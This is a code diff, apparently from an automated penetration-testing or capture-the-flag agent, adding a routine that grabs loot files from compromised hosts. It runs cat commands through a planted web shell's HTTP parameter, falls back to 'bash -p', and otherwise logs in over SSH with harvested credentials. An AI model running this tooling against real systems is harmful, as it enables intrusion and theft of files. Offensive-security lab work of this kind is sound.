@@ -19,7 +19,12 @@ import requests
 from core.actions import Action
 from core.state import State
 from executors.base import ExecutionResult
-from knowledge import recipe_for, vuln_reqs_met, vulns_for
+from knowledge import (
+    loot_files_for_discovered,
+    recipe_for,
+    vuln_reqs_met,
+    vulns_for,
+)
 
 _NMAP_PORT_RE = re.compile(r"^(\d+)/tcp\s+open\s+(\S+)(?:\s+(.+))?$", re.MULTILINE)
 
@@ -555,6 +560,98 @@ class RealExecutor:
             action,
             True,
             observed={"creds": all_creds},
+            raw="\n".join(log_lines),
+        )
+
+    def _do_capture_flags(self, action, state, scenario):
+        # two-mode capture. if we have a web_shell URL on this host, cat
+        # through it. else if we have ssh creds, paramiko exec. fail with
+        # no_shell_for_capture if neither path applies.
+        host = self._host(scenario, action.target_host)
+        if host is None:
+            return ExecutionResult(action, False, error="host_unknown")
+
+        host_id = action.target_host
+        access = state.access_levels.get(host_id, "none")
+        if access not in ("web_shell", "ssh_user", "rdp_user", "root"):
+            return ExecutionResult(action, False, error="no_shell_for_capture")
+
+        already = state.loot.get(host_id, {})
+        targets = [
+            p
+            for p in loot_files_for_discovered(host, state, host_id)
+            if p not in already
+        ]
+
+        if not targets:
+            return ExecutionResult(action, False, error="nothing_to_capture")
+
+        shell_url = state.shell_urls.get(host_id)
+        ssh_cred = next((c for c in state.creds_found if c.access == "ssh"), None)
+
+        log_lines: list[str] = []
+        captured: dict[str, str] = {}
+
+        if shell_url:
+            for path in targets:
+                cmd = f"cat {path} 2>/dev/null || /bin/bash -p -c 'cat {path} 2>/dev/null'"
+                try:
+                    resp = requests.get(
+                        shell_url,
+                        params={"cmd": cmd},
+                        timeout=self.http_request_timeout,
+                    )
+                except requests.RequestException as exc:
+                    log_lines.append(f"ERR cat {path} {exc.__class__.__name__}")
+                    continue
+                body = (resp.text or "").strip()
+                log_lines.append(
+                    f"GET cat {path} -> {resp.status_code} ({len(resp.text)} bytes)"
+                )
+                if body and resp.status_code == 200:
+                    captured[path] = body
+        elif ssh_cred:
+            ip = host.get("ip")
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            try:
+                client.connect(
+                    hostname=ip,
+                    port=22,
+                    username=ssh_cred.username,
+                    password=ssh_cred.password,
+                    timeout=5,
+                    allow_agent=False,
+                    look_for_keys=False,
+                )
+                for path in targets:
+                    _, stdout, _ = client.exec_command(f"cat {path}", timeout=5)
+                    body = stdout.read().decode(errors="replace").strip()
+                    log_lines.append(f"SSH cat {path} ({len(body)} bytes)")
+                    if body:
+                        captured[path] = body
+            except (paramiko.SSHException, socket.error, socket.timeout) as exc:
+                log_lines.append(f"ERR ssh {exc.__class__.__name__}")
+            finally:
+                try:
+                    client.close()
+                except Exception:
+                    pass
+        else:
+            return ExecutionResult(action, False, error="no_shell_for_capture")
+
+        if not captured:
+            return ExecutionResult(
+                action,
+                False,
+                error="capture_failed",
+                raw="\n".join(log_lines),
+            )
+
+        return ExecutionResult(
+            action,
+            True,
+            observed={"loot_captured": captured},
             raw="\n".join(log_lines),
         )
 
